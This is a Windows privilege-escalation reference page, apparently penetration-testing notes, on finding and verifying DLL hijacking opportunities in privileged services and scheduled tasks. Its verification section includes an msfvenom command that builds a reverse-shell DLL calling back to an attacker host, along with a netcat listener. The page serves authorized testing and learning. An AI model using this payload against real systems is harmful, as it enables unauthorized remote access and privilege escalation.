# DLL hijacking checks

[← Windows quick reference](../04-windows-privesc.md)

Start with the privileged process, then find a DLL it requests and a directory it searches that you can write to. A writable folder alone is not a DLL hijack.

Record the process account, executable path and architecture, trigger, exact DLL name, existing copies, and the first writable location in the real search order. Windows DLL redirection, KnownDLLs, loaded modules, and process settings can change the simplified order.

## Find a candidate

```powershell
Get-CimInstance -ClassName Win32_Service | Select-Object Name,State,StartName,PathName
Get-ScheduledTask | Select-Object TaskName,Actions,Principal
icacls 'C:\Path\To\Application'
```

Procmon on a local copy of the application can show `CreateFile` requests for a missing DLL. Filter by process name and exact DLL path, then confirm whether the candidate directory is searched before a legitimate copy. Static import lists and scanner labels do not observe every runtime `LoadLibrary` call.

If CIM or task enumeration is restricted, query a known service or task by exact name:

```powershell
sc.exe qc <service-name>
schtasks.exe /query /tn '<task-name>' /fo LIST /v
```

An empty result can mean limited access, not that no privileged launcher exists.

The read-only [Find-ExecutableReferences.ps1](../scripts/Find-ExecutableReferences.ps1) helper searches visible services, tasks, and processes by executable name or full path:

```powershell
.\Find-ExecutableReferences.ps1 'C:\Path\To\application.exe'
```

## Verify the trigger

Before placing a DLL, confirm all of these: the privileged launcher requests that DLL, its search reaches your writable path, and the launcher will start again. Running the app yourself as a low-privilege user only runs the DLL under your own identity.

If you use a generated DLL, name it after the exact missing DLL and use a payload format that matches the target architecture. Keep a copy of any original file and remove your test DLL after verification.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI-IP> LPORT=<PORT> \
  -f dll -o <missing-dll-name>.dll
nc -lvnp <PORT>
```

Place it only in the confirmed writable search location, then trigger the privileged launcher. Check `whoami` in the new session; starting the application yourself would run the DLL with your own token.

## References

- [Microsoft DLL search order](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [Microsoft DLL security](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-security)
